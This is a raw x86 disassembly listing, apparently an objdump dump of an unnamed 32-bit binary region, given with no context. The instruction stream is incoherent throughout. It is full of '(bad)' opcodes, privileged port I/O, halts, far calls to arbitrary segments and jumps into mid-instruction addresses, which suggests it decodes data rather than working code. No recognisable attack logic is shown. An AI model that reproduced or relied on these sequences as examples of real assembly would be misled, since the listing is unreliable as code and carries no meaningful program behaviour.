  4145e8:	cmc    
  4145e9:	adc    BYTE PTR [esi],bl
  4145eb:	ss gs push ebp
  4145ee:	js     0x4145c4
  4145f0:	vcvtsd2ss xmm4,xmm3,QWORD PTR [eax]
  4145f4:	jbe    0x4145ad
  4145f6:	lods   al,BYTE PTR ds:[esi]
  4145f7:	jle    0x41460c
  4145f9:	jno    0x4145c1
  4145fb:	ja     0x4145cb
  4145fd:	in     al,0x4e
  4145ff:	pop    ebx
  414600:	out    0x41,eax
  414602:	lods   al,BYTE PTR ds:[esi]
  414603:	sbb    BYTE PTR [edx],bh
  414605:	(bad)  [ebx+0x575bcda9]
  41460c:	pop    es
  41460d:	dec    ebx
  41460e:	push   esp
  41460f:	gs mov eax,0x45d40508
  414615:	mov    esp,0xad764864
  41461a:	or     eax,DWORD PTR [edx]
  41461c:	sbb    dl,BYTE PTR [eax-0x60]
  41461f:	pop    ebx
  414620:	ffreep st(7)
  414622:	mov    cl,0xb7
  414624:	push   esi
  414625:	cmp    al,0x5c
  414627:	leave  
  414628:	mov    ebp,0x549d662d
  41462d:	or     DWORD PTR [edi],0x8dc474f5
  414633:	and    al,0x10
  414635:	xchg   BYTE PTR [edx+0x3013d0a8],al
  41463b:	dec    ecx
  41463c:	inc    ecx
  41463d:	sbb    eax,0x6acfa821
  414642:	xchg   ecx,eax
  414643:	into   
  414644:	mov    al,ds:0x362b2c1e
  414649:	push   ebx
  41464a:	mov    bl,bh
  41464c:	sbb    DWORD PTR [ebp-0x1087825f],0x53
  414653:	(bad)  
  414654:	lods   al,BYTE PTR ds:[esi]
  414655:	sub    ecx,DWORD PTR [ebx+0xd983544]
  41465b:	xor    eax,0x4e1b56fb
  414660:	inc    ebx
  414661:	inc    ebx
  414662:	inc    ecx
  414663:	ja     0x4146cf
  414665:	inc    ecx
  414666:	repz xor DWORD PTR [ebx],ecx
  414669:	add    bh,dh
  41466b:	hlt    
  41466c:	fild   WORD PTR [edi+0x1a]
  41466f:	push   es
  414670:	jmp    0x41464d
  414672:	dec    edi
  414673:	sbb    dl,BYTE PTR [esi+eiz*2]
  414676:	jmp    0x4146d9
  414678:	sub    edx,esi
  41467a:	mov    bh,BYTE PTR [edi+ebx*1+0x265b6dbb]
  414681:	dec    esp
  414682:	leave  
  414683:	loopne 0x414698
  414685:	mov    eax,0x8fc20a3a
  41468a:	mov    eax,DWORD PTR ds:0x7f9700b4
  414690:	jecxz  0x4146b0
  414692:	fsub   st,st(5)
  414694:	sub    al,0xef
  414696:	add    cl,BYTE PTR ds:0x115f9d95
  41469c:	retf   
  41469d:	mov    cs,WORD PTR [ecx-0x12b1167c]
  4146a3:	or     al,0x0
  4146a5:	push   cs
  4146a6:	and    ah,al
  4146a8:	inc    esi
  4146a9:	arpl   WORD PTR ds:[edi+0x4c],cx
  4146ad:	pop    ss
  4146ae:	outs   dx,DWORD PTR ds:[esi]
  4146af:	imul   eax,esp,0xffffffd0
  4146b2:	cmp    dl,ch
  4146b4:	in     eax,dx
  4146b5:	mov    bl,0x3b
  4146b7:	cmp    bl,BYTE PTR [ebx]
  4146b9:	rol    BYTE PTR [edx+0x6d],1
  4146bc:	adc    eax,0xc027555a
  4146c1:	stos   DWORD PTR es:[edi],eax
  4146c2:	jmp    0xab509d6
  4146c7:	add    eax,0x310d7086
  4146cc:	sub    al,0xf9
  4146ce:	ror    BYTE PTR [esi+0xf],cl
  4146d1:	add    eax,0xd61a77f9
  4146d6:	xor    edx,DWORD PTR [ebx+0x34]
  4146d9:	icebp  
  4146da:	cwde   
  4146db:	xchg   esi,eax
  4146dc:	pop    ecx
  4146dd:	dec    edi
  4146de:	sbb    al,0x74
  4146e0:	mov    eax,ebp
  4146e2:	and    eax,0xa9f38c3e
  4146e7:	test   BYTE PTR [ebp-0x46],dh
  4146ea:	lods   eax,DWORD PTR ds:[esi]
  4146eb:	jnp    0x41467f
  4146ed:	fdivr  DWORD PTR ds:0x9279e2be
  4146f3:	or     eax,0x4714ece4
  4146f8:	std    
  4146f9:	ins    DWORD PTR es:[edi],dx
  4146fa:	sbb    ebp,DWORD PTR [edi]
  4146fc:	pop    esp
  4146fd:	lea    eax,[edi+0x5da2fac7]
  414703:	repz inc edx
  414705:	xor    BYTE PTR [edx+ebp*4+0x54],0x9c
  41470a:	ret    0xfcc5
  41470d:	mov    dh,0x73
  41470f:	add    edx,edx
  414711:	add    ah,ah
  414713:	push   ebx
  414714:	test   ebx,esi
  414716:	mov    edi,0x28c34dec
  41471b:	(bad)  
  41471c:	ror    ecx,1
  41471e:	outs   dx,BYTE PTR ds:[esi]
  41471f:	pop    es
  414720:	test   DWORD PTR [ecx-0x1d553129],edi
  414726:	or     bl,bh
  414728:	cwde   
  414729:	idiv   esp
  41472b:	aad    0x70
  41472d:	push   esp
  41472e:	std    
  41472f:	(bad)  
  414730:	fild   DWORD PTR [ecx-0x93f5067]
  414736:	pushf  
  414737:	ret    
  414738:	inc    ebp
  414739:	jae    0x41471e
  41473b:	in     eax,0xfe
  41473d:	jge    0x4146ed
  41473f:	ins    BYTE PTR es:[edi],dx
  414740:	mov    cl,0x34
  414742:	cmp    BYTE PTR [eax+0x11],dh
  414745:	test   eax,0xac19bf61
  41474a:	(bad)  
  41474b:	popa   
  41474c:	sub    BYTE PTR ds:0x4ef76337,cl
  414752:	xor    eax,0x64c66fb6
  414757:	nop
  414758:	dec    edi
  414759:	aam    0xaf
  41475b:	push   es
  41475c:	mov    dh,0x9a
  41475e:	pop    ss
  41475f:	ja     0x414722
  414761:	sbb    ebx,0x33
  414764:	(bad)  
  414765:	xor    al,0xf
  414767:	and    BYTE PTR ds:0xd22c4d3e,ch
  41476d:	push   ds
  41476e:	loop   0x4147dd
  414770:	dec    ebp
  414771:	mov    eax,0x682388d8
  414776:	sar    edx,0x59
  414779:	daa    
  41477a:	or     eax,0x69d8c94
  41477f:	pop    eax
  414780:	dec    esp
  414781:	stc    
  414782:	pop    ss
  414783:	lahf   
  414784:	mov    ecx,0x79aae5e9
  414789:	dec    ecx
  41478a:	push   ecx
  41478b:	dec    ecx
  41478c:	aaa    
  41478d:	inc    esi
  41478e:	cdq    
  41478f:	test   DWORD PTR [ebp+0x529ed38],esi
  414795:	mov    bh,bl
  414797:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414799:	adc    al,0x6d
  41479b:	sub    WORD PTR [ecx+ebp*1],bp
  41479f:	pop    ss
  4147a0:	in     al,dx
  4147a1:	ret    
  4147a2:	je     0x414760
  4147a4:	jo     0x41481f
  4147a6:	popf   
  4147a7:	(bad)  
  4147a8:	(bad)  
  4147aa:	fldenv [ecx-0x7c]
  4147ad:	dec    edx
  4147ae:	xchg   ebx,eax
  4147af:	mov    ecx,0x10373f29
  4147b4:	lea    esi,[esi-0x74]
  4147b7:	ja     0x414807
  4147b9:	das    
  4147ba:	retf   
  4147bb:	and    al,0x76
  4147bd:	xchg   esp,eax
  4147be:	cmp    eax,0x6e1838a2
  4147c3:	adc    DWORD PTR [esi+0x21f63414],edi
  4147c9:	or     DWORD PTR [edx],0xc
  4147cc:	mov    dh,0xad
  4147ce:	adc    ebp,edx
  4147d0:	push   ebx
  4147d1:	jnp    0x414756
  4147d3:	sbb    DWORD PTR [ecx+0x25],edx
  4147d6:	mov    ecx,0x68772bf1
  4147dc:	xchg   edi,eax
  4147dd:	mov    eax,ds:0x48749c1
  4147e2:	fistp  DWORD PTR [esi+0x73]
  4147e5:	push   ecx
  4147e6:	dec    edx
  4147e7:	xchg   edx,eax
  4147e8:	ja     0x41483b
  4147ea:	inc    esi
  4147eb:	fcmovu st,st(3)
  4147ed:	cmp    eax,0x96d2e35f
  4147f2:	inc    eax
  4147f3:	ror    ecx,1
  4147f5:	xchg   esp,eax
  4147f6:	lahf   
  4147f7:	mov    DWORD PTR [esi],ebp
  4147f9:	iret   
  4147fa:	mov    BYTE PTR [edx],0xb0
  4147fd:	and    edi,DWORD PTR [edx-0x583f6732]
  414803:	and    edi,DWORD PTR [ecx+esi*8+0x66b7b12b]
  41480a:	ret    
  41480b:	not    ebx
  41480d:	sub    bh,BYTE PTR [edx-0x40]
  414810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414811:	test   eax,0x84e90615
  414816:	es dec eax
  414818:	loopne 0x4147ff
  41481a:	repz call 0x8e21:0x4bb47f8c
  414822:	mov    al,ds:0x2c8d86e3
  414827:	std    
  414828:	sub    edi,DWORD PTR [edx+0x46]
  41482b:	cmp    al,BYTE PTR [ebp+0xc63eb51]
  414831:	or     eax,0xed5c11be
  414836:	jge    0x4147d7
  414838:	out    dx,eax
  414839:	test   eax,0x33023550
  41483e:	mov    dh,0x1c
  414840:	add    DWORD PTR [edi],ecx
  414842:	pop    edx
  414843:	xor    BYTE PTR [esi+ebx*2+0x25],ch
  414847:	rcl    DWORD PTR [edi],0xc5
  41484a:	inc    ebx
  41484b:	sbb    DWORD PTR [edx],esp
  41484d:	xor    BYTE PTR ds:0xf7580cf0,al
  414853:	cmp    eax,0xc60c5b6b
  414858:	or     BYTE PTR [edi-0x1dacd704],cl
  41485e:	into   
  41485f:	mov    ebx,0x668891e9
  414864:	cmp    ebp,eax
  414866:	jp     0x41482d
  414868:	add    al,BYTE PTR [ebx+0x9]
  41486b:	fs inc esp
  41486d:	mov    ebx,0x8692adcc
  414872:	test   DWORD PTR ds:0xa14a38fd,ebx
  414878:	lods   eax,DWORD PTR ds:[esi]
  414879:	cmp    DWORD PTR ds:0x4cc2acfa,ecx
  41487f:	xchg   ebp,eax
  414880:	test   eax,0x36d0a528
  414885:	xlat   BYTE PTR ds:[ebx]
  414886:	mov    esi,DWORD PTR [esi-0x7c]
  414889:	in     eax,0xa3
  41488b:	cmp    DWORD PTR [ecx],ebp
  41488d:	outs   dx,DWORD PTR ds:[esi]
  41488e:	test   DWORD PTR [ebx],0xd2dc95cc
  414894:	pop    ecx
  414895:	cmp    edx,DWORD PTR ds:0xd0455e4f
  41489b:	in     eax,0xc2
  41489d:	je     0x414878
  41489f:	(bad)  [edx+0x2e]
  4148a2:	push   0xe23f8d64
  4148a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148a8:	mov    edx,0xf9131694
  4148ad:	inc    ebp
  4148ae:	pop    es
  4148af:	push   edi
  4148b0:	pop    eax
  4148b1:	adc    dh,BYTE PTR [ebx+0x19]
  4148b4:	adc    dh,BYTE PTR [ecx]
  4148b6:	sub    edx,edi
  4148b8:	ret    
  4148b9:	ror    BYTE PTR [esi-0x76],1
  4148bc:	xchg   edi,eax
  4148bd:	gs enter 0x2e70,0xaf
  4148c2:	fist   WORD PTR [ecx-0x15]
  4148c5:	sub    esp,DWORD PTR [ecx+0x6713d463]
  4148cb:	mov    edi,edi
  4148cd:	aas    
  4148ce:	inc    ebx
  4148cf:	or     DWORD PTR [edx-0x6d7d9bd1],0x605f5784
  4148d9:	pop    esp
  4148da:	and    esi,ecx
  4148dc:	ins    DWORD PTR es:[edi],dx
  4148dd:	sub    BYTE PTR es:0x2dab5c2f,al
  4148e4:	jl     0x41488f
  4148e6:	in     eax,dx
  4148e7:	fwait
  4148e8:	inc    edi
  4148e9:	bound  eax,QWORD PTR [edx+0x9b97623]
  4148ef:	mov    esi,ebx
  4148f1:	mov    BYTE PTR [ecx-0x2e9fee0],dl
  4148f7:	mov    ebx,0xb4c84d6b
  4148fc:	xchg   ecx,eax
  4148fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148fe:	shr    BYTE PTR [edx+0x3d8a5858],1
  414904:	pop    edi
  414905:	leave  
  414906:	sub    al,0xaf
  414908:	jmp    0x41496a
  41490a:	mov    ebp,DWORD PTR [esi-0x72]
  41490d:	mov    ds:0x33f97018,eax
  414912:	call   0x631b:0xc0700b70
  414919:	lods   eax,DWORD PTR ds:[esi]
  41491a:	sahf   
  41491b:	xor    eax,0xe9af927
  414920:	mov    edx,0x1ebe0f0d
  414925:	pop    edx
  414926:	mov    ebx,0x4ac72d48
  41492b:	hlt    
  41492c:	in     eax,dx
  41492d:	or     al,0x13
  41492f:	mov    ebx,0x4ec0211
  414934:	arpl   WORD PTR [ecx+0x2c86b227],ax
  41493a:	mov    dh,0xa1
  41493c:	out    dx,al
  41493d:	aam    0x84
  41493f:	mov    ds:0x9f0c85f5,eax
  414944:	sbb    ebp,ebp
  414946:	and    eax,0xb8e0199b
  41494b:	aas    
  41494c:	out    dx,al
  41494d:	in     eax,0xe2
  41494f:	loopne 0x41491b
  414951:	xor    DWORD PTR [ecx],ecx
  414953:	mov    dh,0xf7
  414955:	lds    eax,FWORD PTR [edx+0x4309ed8f]
  41495b:	pop    ecx
  41495c:	cli    
  41495d:	mov    ecx,0xacda9a64
  414962:	and    BYTE PTR [ecx-0x53],al
  414965:	shl    DWORD PTR es:[eax+0x5],cl
  414969:	imul   eax,DWORD PTR [edi-0x4b],0x477221a8
  414970:	push   ebx
  414971:	cld    
  414972:	test   DWORD PTR [esi],eax
  414974:	pop    esi
  414975:	aam    0x5f
  414977:	jne    0x4149b9
  414979:	lods   eax,DWORD PTR ds:[esi]
  41497a:	sub    eax,esp
  41497c:	lock fmul DWORD PTR [eax]
  41497f:	pop    ds
  414980:	ret    0x28f3
  414983:	in     eax,0x93
  414985:	out    0x4c,eax
  414987:	push   ss
  414988:	sbb    eax,0xf63043b1
  41498d:	mov    BYTE PTR ds:0x6c6da185,bh
  414993:	and    DWORD PTR [edi+0x60],0x2e
  414997:	dec    esi
  414998:	sub    cl,BYTE PTR gs:[esi+ecx*2+0xe]
  41499d:	xchg   DWORD PTR [ebx+0x0],ebp
  4149a0:	dec    esi
  4149a1:	(bad)  
  4149a2:	cld    
  4149a3:	sub    BYTE PTR [esi-0x6a],bl
  4149a6:	(bad)  
  4149a7:	scas   al,BYTE PTR es:[edi]
  4149a8:	(bad)  
  4149a9:	pop    ebp
  4149aa:	imul   edx,DWORD PTR [esi],0xffffffe7
  4149ad:	cmp    BYTE PTR [edi+0x30],dh
  4149b0:	push   esp
  4149b1:	push   ebp
  4149b2:	pop    esp
  4149b3:	test   DWORD PTR [ecx-0x2],0xffa3d3b
  4149ba:	jmp    0x5b93:0x6f4f2101
  4149c1:	xchg   edi,eax
  4149c2:	fld    DWORD PTR [eax]
  4149c4:	adc    BYTE PTR [esp+ecx*4],0x34
  4149c8:	or     BYTE PTR [edx-0x6d],al
  4149cb:	cmc    
  4149cc:	in     al,0x3d
  4149ce:	in     eax,dx
  4149cf:	adc    al,0x96
  4149d1:	loope  0x4149f1
  4149d3:	test   DWORD PTR [edi],ecx
  4149d5:	dec    ecx
  4149d6:	in     eax,dx
  4149d7:	jae    0x41499e
  4149d9:	test   al,0x46
  4149db:	pop    ebp
  4149dc:	push   esi
  4149dd:	(bad)  
  4149de:	js     0x4149bd
  4149e0:	popa   
  4149e1:	xchg   DWORD PTR [edx-0x6e],ebp
  4149e4:	pop    ebx
  4149e5:	adc    DWORD PTR [ecx+0x7c888fa8],ecx
  4149eb:	push   eax
  4149ec:	pop    eax
  4149ed:	sbb    eax,0x87275beb
  4149f2:	sub    eax,0x403af792
  4149f7:	inc    ebx
  4149f8:	inc    edi
  4149f9:	or     DWORD PTR [eax+0x15b76a08],esi
  4149ff:	nop
  414a00:	fs and al,0x75
  414a03:	pop    es
  414a04:	jne    0x4149a8
  414a06:	push   ds
  414a07:	popf   
  414a08:	pop    ebx
  414a09:	pop    esi
  414a0a:	jge    0x4149b7
  414a0c:	je     0x41499c
  414a0e:	stos   DWORD PTR es:[edi],eax
  414a0f:	push   ebp
  414a10:	(bad)  
  414a11:	shl    DWORD PTR [edx],0x82
  414a14:	xchg   edx,eax
  414a15:	add    ch,BYTE PTR [eax-0xd]
  414a18:	ins    DWORD PTR es:[edi],dx
  414a19:	ins    DWORD PTR es:[edi],dx
  414a1a:	jp     0x4149a1
  414a1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a1d:	jp     0x414a95
  414a1f:	pop    esp
  414a20:	jp     0x414a7d
  414a22:	ins    DWORD PTR es:[edi],dx
  414a23:	mov    eax,ds:0x75a2adb1
  414a28:	popf   
  414a29:	sub    dl,BYTE PTR [esi]
  414a2b:	out    dx,eax
  414a2c:	shr    DWORD PTR [ecx+0x5a4fc3e3],1
  414a32:	rcl    DWORD PTR [ebx-0x20],1
  414a35:	push   esp
  414a36:	aad    0x5f
  414a38:	icebp  
  414a39:	and    ecx,eax
  414a3b:	(bad)  [ecx]
  414a3d:	stos   DWORD PTR es:[edi],eax
  414a3e:	and    al,0x20
  414a40:	xor    DWORD PTR [edi+ebp*4+0x310dba61],ecx
  414a47:	sbb    dh,BYTE PTR [ebx]
  414a49:	pop    esi
  414a4a:	repz adc dh,BYTE PTR [edi-0x661f20b8]
  414a51:	mov    eax,ebp
  414a53:	cmp    BYTE PTR [ebx],ah
  414a55:	sbb    ah,cl
  414a57:	sub    ebx,ebx
  414a59:	in     eax,dx
  414a5a:	ins    BYTE PTR es:[edi],dx
  414a5b:	aas    
  414a5c:	pusha  
  414a5d:	add    ch,BYTE PTR [ebx+eiz*1]
  414a60:	iret   
  414a61:	mov    ch,0x9e
  414a63:	das    
  414a64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a65:	and    dh,dl
  414a67:	xchg   DWORD PTR [ebp+0x70793cd3],eax
  414a6d:	cs cmp al,0x93
  414a70:	jns    0x414abf
  414a72:	push   ebp
  414a73:	fs daa 
  414a75:	inc    DWORD PTR [esi+0x30]
  414a78:	retf   0x3f8f
  414a7b:	or     edx,DWORD PTR [edx+edx*1-0x48]
  414a7f:	retf   
  414a80:	adc    eax,DWORD PTR [esp+ecx*1-0x44530674]
  414a87:	push   ecx
  414a88:	or     ecx,DWORD PTR [ebx+0x4df5ca40]
  414a8e:	pop    ecx
  414a8f:	jbe    0x414a34
  414a91:	rcr    DWORD PTR [edi],1
  414a93:	test   eax,0x85f2dffe
  414a98:	retf   0xd8ee
  414a9b:	mov    bl,0x82
  414a9d:	imul   esp,DWORD PTR [ebx],0x2e
  414aa0:	mov    esp,0x98862f77
  414aa5:	xchg   ecx,eax
  414aa6:	fnstsw WORD PTR [edx-0x39649aaf]
  414aac:	mov    eax,0xca145a89
  414ab1:	and    BYTE PTR [esi-0x4616c8e7],bl
  414ab7:	cli    
  414ab8:	pushf  
  414ab9:	push   edx
  414aba:	fwait
  414abb:	mov    bl,0x48
  414abd:	mov    esi,ss
  414abf:	lods   al,BYTE PTR ds:[esi]
  414ac0:	jbe    0x414a9d
  414ac2:	pop    esp
  414ac3:	stc    
  414ac4:	int3   
  414ac5:	iret   
  414ac6:	dec    ebp
  414ac7:	mov    ds:0x8163cee8,al
  414acc:	xchg   ecx,eax
  414acd:	mov    al,ds:0xad71fafb
  414ad2:	push   ecx
  414ad3:	fcomp  QWORD PTR [esi+0x56]
  414ad6:	inc    edi
  414ad7:	dec    ebp
  414ad8:	add    eax,0xd748d70
  414add:	sbb    eax,0x244ff01
  414ae2:	call   0xe1ab4d
  414ae7:	les    ecx,FWORD PTR [eax-0x79f5c80b]
  414aed:	add    ch,al
  414aef:	test   BYTE PTR [edx-0x61516bac],bh
  414af5:	inc    eax
  414af6:	jecxz  0x414aa6
  414af8:	aas    
  414af9:	outs   dx,BYTE PTR ds:[esi]
  414afa:	pop    ebx
  414afb:	push   edx
  414afc:	mul    eax
  414afe:	mov    edi,0xfa75671d
  414b03:	les    ecx,FWORD PTR [eax]
  414b05:	jae    0x414ad5
  414b07:	xchg   ebp,eax
  414b08:	out    0x70,eax
  414b0a:	adc    al,BYTE PTR [esp+eiz*8-0xd70cc72]
  414b11:	enter  0x2deb,0x98
  414b15:	mov    esp,0x1dff9e21
  414b1a:	cli    
  414b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b1c:	(bad)  
  414b1d:	in     al,dx
  414b1e:	jne    0x414b0e
  414b20:	push   0x1
  414b22:	pop    ebx
  414b23:	sbb    eax,DWORD PTR [edi+esi*8+0x1e]
  414b27:	xlat   BYTE PTR ds:[ebx]
  414b28:	pop    edx
  414b29:	mov    edx,0x9b267936
  414b2e:	shr    DWORD PTR [edi+0x721de5ea],0xdf
  414b35:	test   eax,0xf86e1c36
  414b3a:	lods   eax,DWORD PTR ds:[esi]
  414b3b:	out    dx,eax
  414b3c:	data16 or BYTE PTR [ecx-0x3b017663],ch
  414b43:	mov    bl,0x91
  414b45:	repz cmc 
  414b47:	sar    ah,1
  414b49:	xrelease mov DWORD PTR [edx],ecx
  414b4c:	fsubr  QWORD PTR [ebx]
  414b4e:	sbb    DWORD PTR [edx-0x249d562f],0xa242d4b5
  414b58:	stos   BYTE PTR es:[edi],al
  414b59:	les    edx,FWORD PTR [ecx]
  414b5b:	(bad)  
  414b5c:	pop    ecx
  414b5d:	pop    ss
  414b5e:	call   0x9c35:0x28f7297e
  414b65:	sub    cl,0x30
  414b68:	pop    edx
  414b69:	dec    ecx
  414b6a:	mov    eax,0x66103dc5
  414b6f:	or     cl,BYTE PTR [eax+0x15]
  414b72:	inc    edi
  414b73:	out    0x33,al
  414b75:	sar    DWORD PTR [eax+edi*1],cl
  414b78:	mov    ds:0x4e7080e9,eax
  414b7d:	das    
  414b7e:	mov    cl,bh
  414b80:	mov    dh,0x5a
  414b82:	and    bl,BYTE PTR [ebx+0x3b2507de]
  414b88:	daa    
  414b89:	mov    dh,0xce
  414b8b:	inc    eax
  414b8c:	push   0xe5d1fbbf
  414b91:	sub    al,al
  414b93:	inc    eax
  414b94:	or     dh,BYTE PTR [edi+0x41]
  414b97:	sub    DWORD PTR [esi],esp
  414b99:	inc    esp
  414b9a:	xchg   ebp,eax
  414b9b:	aaa    
  414b9c:	jb     0x414bbf
  414b9e:	sahf   
  414b9f:	dec    esp
  414ba0:	pop    esp
  414ba1:	push   edi
  414ba2:	push   ecx
  414ba3:	mov    DWORD PTR [ebp+ecx*4+0x2b02e02],esi
  414baa:	call   0x93b2:0x47e2495f
  414bb1:	jmp    0xe4e44f17
  414bb6:	aam    0xa7
  414bb8:	retf   
  414bb9:	aad    0x4d
  414bbb:	adc    eax,0x986b907c
  414bc0:	call   0x9683:0xe4d80730
  414bc7:	inc    edi
  414bc8:	sub    cl,BYTE PTR [ecx+0x73]
  414bcb:	js     0x414bda
  414bcd:	dec    esp
  414bce:	adc    ah,BYTE PTR [eax+0x19]
  414bd1:	test   BYTE PTR [edx],ah
  414bd3:	sub    BYTE PTR [eax],dl
  414bd5:	push   edx
  414bd6:	dec    BYTE PTR ds:0x6279ba5
  414bdc:	mov    DWORD PTR [edx-0x40d5a675],esp
  414be2:	mov    ss,WORD PTR [edi+0x6f9236b4]
  414be8:	xor    dh,BYTE PTR [ebx-0x52]
  414beb:	inc    edi
  414bec:	cld    
  414bed:	imul   DWORD PTR [ecx]
  414bef:	(bad)  
  414bf1:	std    
  414bf2:	inc    edi
  414bf3:	push   es
  414bf4:	and    al,BYTE PTR cs:[edx]
  414bf7:	jo     0x414bc9
  414bf9:	jg     0x414b92
  414bfb:	jle    0x414c5f
  414bfd:	(bad)  [edx+0x782b147c]
  414c03:	outs   dx,BYTE PTR ds:[esi]
  414c04:	mov    bl,0x80
  414c06:	mov    al,0xaf
  414c08:	mov    cl,BYTE PTR [edx*4-0x7183cb7]
  414c0f:	jmp    0x414bd2
  414c11:	pushf  
  414c12:	test   BYTE PTR [ebx-0x61586196],bh
  414c18:	js     0x414c91
  414c1a:	mov    bl,0x66
  414c1c:	lock sbb eax,0x835950af
  414c22:	cwde   
  414c23:	(bad)  
  414c24:	sub    DWORD PTR [ecx-0xe1de477],esi
  414c2a:	stos   DWORD PTR es:[edi],eax
  414c2b:	push   eax
  414c2c:	jmp    0x3ddc2783
  414c31:	dec    esp
  414c32:	or     ch,dh
  414c34:	mov    ds:0xc4d4947c,al
  414c39:	jb     0x414bd3
  414c3b:	push   edx
  414c3c:	and    BYTE PTR [esi+edx*4],cl
  414c3f:	cwde   
  414c40:	mov    bl,ch
  414c42:	ins    BYTE PTR es:[edi],dx
  414c43:	mov    BYTE PTR [esi+ebx*2],al
  414c46:	loope  0x414c3b
  414c48:	mov    ch,0xd6
  414c4a:	add    eax,0x31419b6e
  414c4f:	aaa    
  414c50:	leave  
  414c51:	cmp    dl,al
  414c53:	xchg   eax,eax
  414c55:	or     bl,BYTE PTR [eax+0x1988dddc]
  414c5b:	loope  0x414cd6
  414c5d:	js     0x414c43
  414c5f:	stc    
  414c60:	and    DWORD PTR [ecx],esi
  414c62:	sub    BYTE PTR [ebx+0x45d4f79c],ah
  414c68:	out    0x88,eax
  414c6a:	dec    ecx
  414c6b:	cmp    eax,0x45940ee1
  414c70:	es mov eax,0x5b7c7629
  414c76:	dec    ecx
  414c77:	movaps XMMWORD PTR [edi+0x2cb9ad8e],xmm1
  414c7e:	and    BYTE PTR [edi],dl
  414c80:	test   DWORD PTR [edx+0x5bc41051],edx
  414c86:	or     bh,BYTE PTR [edi]
  414c88:	and    eax,0xd7832e3
  414c8d:	mov    ds:0x390913cc,al
  414c92:	add    esi,edx
  414c94:	dec    edi
  414c95:	cmp    al,0xed
  414c97:	shl    DWORD PTR [edx],cl
  414c99:	out    dx,al
  414c9a:	or     BYTE PTR [ecx],dh
  414c9c:	int3   
  414c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c9e:	mov    ds:0x7b079d08,al
  414ca3:	setle  BYTE PTR [ecx]
  414ca6:	xchg   ebx,eax
  414ca7:	pop    esp
  414ca8:	inc    esi
  414ca9:	loopne 0x414ceb
  414cab:	(bad)
  414caf:	or     DWORD PTR [ebx+0x151ff309],esi
  414cb5:	stos   DWORD PTR es:[edi],eax
  414cb6:	retf   0xf930
  414cb9:	mov    esi,0xe54f9aa4
  414cbe:	push   cs
  414cbf:	std    
  414cc0:	std    
  414cc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cc2:	sbb    al,0xfb
  414cc4:	pop    esi
  414cc5:	mov    ah,0xe7
  414cc7:	mov    ds:0x36bfecd6,al
  414ccc:	iret   
  414ccd:	xor    edi,DWORD PTR [ebx+eax*1-0x7235d997]
  414cd4:	push   eax
  414cd5:	xor    BYTE PTR [eax-0x1f],cl
  414cd8:	adc    BYTE PTR [esi],ch
  414cda:	popf   
  414cdb:	popa   
  414cdc:	out    dx,al
  414cdd:	or     edx,esi
  414cdf:	jg     0x414d59
  414ce1:	dec    ecx
  414ce2:	sbb    BYTE PTR [edi-0x513c9382],ah
  414ce8:	out    0x25,eax
  414cea:	loopne 0x414cfd
  414cec:	dec    eax
  414ced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cee:	js     0x414d3e
  414cf0:	add    bh,bh
  414cf2:	ror    BYTE PTR [esi],1
  414cf4:	repnz fnstenv [edx]
  414cf7:	enter  0xac46,0xdf
  414cfb:	scas   al,BYTE PTR es:[edi]
  414cfc:	push   edx
  414cfd:	shl    DWORD PTR [ebx-0x18ba1c9],cl
  414d03:	retf   0x12e
  414d06:	inc    edi
  414d07:	inc    ebx
  414d08:	mov    ebp,0x71f6ba51
  414d0d:	add    BYTE PTR [ebp+edi*8+0x27ab71cb],dh
  414d14:	pop    ebx
  414d15:	add    DWORD PTR [eax-0x46fab39e],edx
  414d1b:	fcomp  QWORD PTR [ebp+edx*8+0xe4008d1]
  414d22:	push   ebx
  414d23:	es mov dl,0xd3
  414d26:	push   0xffffffca
  414d28:	js     0x414d21
  414d2a:	sub    ebx,ebx
  414d2c:	in     eax,dx
  414d2d:	out    0xf9,al
  414d2f:	sub    BYTE PTR [esi+0x4f],dl
  414d32:	sub    al,0xcb
  414d34:	scas   eax,DWORD PTR es:[edi]
  414d35:	dec    ebp
  414d36:	mov    dh,bh
  414d38:	(bad)  
  414d39:	fs inc esp
  414d3b:	sti    
  414d3c:	shr    DWORD PTR [ecx+0x38e12fc2],cl
  414d42:	jecxz  0x414d5e
  414d44:	add    dh,BYTE PTR [edi]
  414d46:	loop   0x414d73
  414d48:	ins    DWORD PTR es:[edi],dx
  414d49:	cmp    al,0x20
  414d4b:	stos   BYTE PTR es:[edi],al
  414d4c:	stos   DWORD PTR es:[edi],eax
  414d4d:	jecxz  0x414d8a
  414d4f:	jae    0x414d99
  414d51:	jecxz  0x414db9
  414d53:	and    ebx,esi
  414d55:	jne    0x414d78
  414d57:	daa    
  414d58:	call   0x887:0x9f67a68c
  414d5f:	sub    DWORD PTR ss:[eax],edi
  414d62:	scas   eax,DWORD PTR es:[edi]
  414d63:	mov    esp,0xb9100ade
  414d68:	hlt    
  414d69:	sub    edi,DWORD PTR [edx+0x944e992]
  414d6f:	mov    dl,0x98
  414d71:	enter  0x490b,0xfc
  414d75:	and    DWORD PTR [ebx],esp
  414d77:	mov    edi,DWORD PTR [ecx]
  414d79:	xor    eax,0xaf71b324
  414d7e:	and    cl,BYTE PTR [esp-0x561a1fbf]
  414d85:	test   eax,0x1a9ea881
  414d8a:	mov    ecx,0xfb70590b
  414d8f:	mov    ebx,0xa5d5db6
  414d94:	push   eax
  414d95:	lea    esi,[esi]
  414d97:	jg     0x414dd6
  414d99:	inc    esp
  414d9a:	push   ds
  414d9b:	sbb    ebx,esi
  414d9d:	in     al,0xd4
  414d9f:	shl    DWORD PTR ds:0xa46d9220,0xaf
  414da6:	dec    edx
  414da7:	cmp    dh,BYTE PTR [edx]
  414da9:	dec    ecx
  414daa:	cmp    DWORD PTR [ebx],eax
  414dac:	shl    BYTE PTR [ebp-0x18f8de83],1
  414db2:	test   BYTE PTR [esi+0x53],al
  414db5:	xchg   esp,eax
  414db6:	push   ecx
  414db7:	cli    
  414db8:	cld    
  414db9:	lods   al,BYTE PTR ds:[esi]
